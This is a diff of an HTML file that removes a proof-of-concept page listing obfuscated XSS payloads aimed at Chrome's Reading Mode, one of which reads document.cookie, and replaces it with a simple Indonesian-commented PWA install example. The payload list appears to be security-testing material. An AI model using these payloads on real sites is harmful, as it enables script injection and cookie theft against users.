@@ -3,36 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XSS Trigger in Google Reading Mode<i>aliooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooth</i></title>
-    <style>
-        body { font-family: Arial, sans-serif; margin: 20px; }
-        h1 { text-align: center; }
-        article { max-width: 800px; margin: 0 auto; }
-        pre { background: #f4f4f4; padding: 10px; border: 1px solid #ddd; overflow-x: auto; }
-    </style>
+    <title>Simple PWA Example</title>
+    <!-- Link ke manifest.json -->
+    <link rel="manifest" href="manifest.json">
+    <!-- Ikon buat app (lo bisa ganti dengan file ikon lo sendiri) -->
+    <link rel="icon" href="icon.png" type="image/png">
 </head>
 <body>
-    <h1>Testing XSS in Google Reading Mode</h1>
-    <p>This HTML is designed to potentially trigger XSS when viewed in Google's Reading Mode. The payloads are embedded in the main article content for POC purposes. Open this page in Chrome and activate Reading Mode to test.</p>
-    
-    <article>
-        <h2>Main Content with Embedded Payloads</h2>
-        <p>Here are some advanced XSS payloads that might bypass sanitization in Reading Mode:</p>
-        
-        <pre>"&gt;&lt;/textarea&gt;&lt;Img Src=OnXSS OnError=prompt(1)&gt;</pre>
-        <pre>'-eval(window/*xxx*/['al' + 'ert'](document/*xxx*/['coo' + 'kie'])-'</pre>
-        <pre>"-ConFirM(1)-"</pre>
-        <pre>'"><Body OnLoad=confirm(1)></pre>
-        <pre>'"><svg onfake="1" onload="confirm(1)"></pre>
-        <pre>-->""/>XXX</script><deTailS open x=">" ontoggle=(co\u006efirm)`1`></pre>
-        <pre>javascript:alert(1)</pre>
-        <pre>");javascript:alert(1);//</pre>
-        <pre>ONXss=><svg/ONLoad=confirm(1)+x</pre>
-        <pre>'"><img src=x onerrora=confirm() onerror=confirm(1)></pre>
-        <pre>'";&lt;/script&gt;&lt;script&gt;prompt(1);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;!--</pre>
-        <pre>--&gt;""/&gt;XXX&lt;/script&gt;&lt;svG open x="&gt;" OnLoad=(co\u006efirm)`1`&gt;</pre>
+    <h1>Halo, ini PWA sederhana!</h1>
+    <p>Klik tombol di bawah buat instal sebagai app.</p>
+    <button id="installButton" style="display: none;">Install App</button>
 
-        <p>If Reading Mode extracts and renders this content without proper escaping, these could trigger alerts or other JS execution. Fuck yeah, let's see if Google slips up on this shit.</p>
-    </article>
+    <script>
+        let deferredPrompt; // Variabel buat simpan event prompt
+
+        // Tangkap event beforeinstallprompt (ini API yang lo maksud)
+        window.addEventListener('beforeinstallprompt', (e) => {
+            // Cegah prompt otomatis muncul, simpan dulu
+            e.preventDefault();
+            deferredPrompt = e;
+            // Tampilkan tombol instal
+            document.getElementById('installButton').style.display = 'block';
+        });
+
+        // Handle klik tombol buat trigger instal
+        document.getElementById('installButton').addEventListener('click', async () => {
+            if (deferredPrompt) {
+                // Panggil API prompt instal
+                deferredPrompt.prompt();
+                // Tunggu user pilih
+                const { outcome } = await deferredPrompt.userChoice;
+                console.log(`User choice: ${outcome}`); // 'accepted' atau 'dismissed'
+                deferredPrompt = null;
+            }
+        });
+
+        // Optional: Daftarin service worker buat PWA full
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('sw.js')
+                .then(reg => console.log('Service Worker registered!', reg))
+                .catch(err => console.error('Service Worker registration failed:', err));
+        }
+    </script>
 </body>
 </html>
